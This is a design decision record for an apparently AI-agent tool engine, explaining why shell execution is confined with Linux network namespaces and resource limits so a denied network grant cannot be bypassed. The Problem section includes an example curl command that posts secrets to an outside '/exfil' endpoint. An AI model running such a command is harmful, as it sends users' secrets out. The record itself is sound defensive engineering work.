# ADR 0007: Enforce network capability in the kernel, not the policy layer

- **Status:** Accepted
- **Date:** 2026-09-05

## Problem

The capability system had a hole that made one of its grants meaningless.

`shell.run` declares `shell.execute`. The default policy grants that and denies
`network.request`. But a shell can open a socket, so:

```console
$ astraforge run "..."   # network.request DENIED by policy
# a task running: sh -c "curl https://example.com/exfil -d @secrets"
# ...succeeded.
```

The policy refused `network.request` at the front door while `shell.execute`
held a key to the back one. Path containment did not help: it constrains the
`fs.*` tools, but once `sh` is running the kernel — not AstraForge — decides
what that process may touch.

This is worse than having no capability at all, because the documentation
implied a control that did not exist.

## Options considered

1. **Ban `sh -c` / scan command strings.** Cheap, and worthless: `python -c`,
   `make`, a test runner or any script can open a socket. Enumerating hostile
   commands is a losing game, and it would break legitimate work.
2. **Require a container for all shell execution.** Genuinely strong. But it
   makes Docker a hard dependency for the primary tool, destroys the local
   developer experience, and is unavailable in many CI sandboxes — including the
   one this project is developed in.
3. **Seccomp filter blocking `socket()`.** Precise and cheap, but `libseccomp`
   bindings are an extra dependency, and a raw BPF filter is architecture-
   specific and hard to review. It also does not cover pre-opened descriptors.
4. **Unprivileged Linux network namespace.** The child gets no interfaces except
   loopback. Egress is not filtered, it is *absent*. No dependency, no
   privileges, ~1 ms cost, and the guarantee comes from the kernel.
5. **Document the limitation and move on.** Honest, but leaves a documented
   capability that does not do what its name says.

## Decision

Adopt **option 4**, with resource limits applied in the same step, and degrade
explicitly where namespaces are unavailable.

Rationale:

- It closes the actual gap with a kernel guarantee rather than a heuristic. A
  process with no network interface cannot reach the network regardless of what
  binary it runs or how clever the command string is.
- It costs nothing: no new dependency, no privilege, no configuration. This
  matters because a security control that complicates the default workflow gets
  turned off.
- Option 2 remains available and is now documented as the answer for untrusted
  workloads and for confining filesystem reads, which namespaces alone do not
  address here.

The probe that detects support runs in a **forked child**, because `unshare` is
irreversible for the calling process: testing it inline would put the engine
itself into a network namespace and cut it off from its own model provider.

## Consequences

**Gained.** `network.request` now means something. Without the grant a shell
cannot reach the network, verified by a test that opens a real socket to
`1.1.1.1:53` and asserts failure. Fork bombs, memory balloons and disk-filling
loops are bounded by `RLIMIT_NPROC` / `RLIMIT_AS` / `RLIMIT_FSIZE`.

**Fail closed.** If isolation is requested and cannot be applied, the child
raises and dies rather than executing unconfined. Tested by simulating an
`unshare` failure.

**Observable.** Every shell call carries `sandbox.applied` evidence and an
`isolation` field, and `astraforge tools` prints what the machine can enforce.
A user must never *assume* a sandbox is active.

**Not gained — and documented as such.** Host filesystem reads are still
possible. Confining them needs a mount namespace with a pivoted root, requiring
privileges or a helper such as `bwrap` that is not guaranteed present. The
container image remains the answer for untrusted code.

**Platform.** Linux-only, and needs unprivileged user namespaces enabled. macOS
and restricted hosts degrade to resource limits, record the downgrade in the
evidence, and report it in `astraforge tools`. A degraded sandbox must never be
indistinguishable from a working one.

**Cost.** One `unshare` per shell call, negligible against process spawn. The
`preexec_fn` runs between `fork` and `exec`, so it must stay minimal — no
logging or heavy allocation.

**Follow-up.** When container execution lands (v0.3), make the backend explicit
so a plan can request the stronger level, and extend confinement to filesystem
reads there.
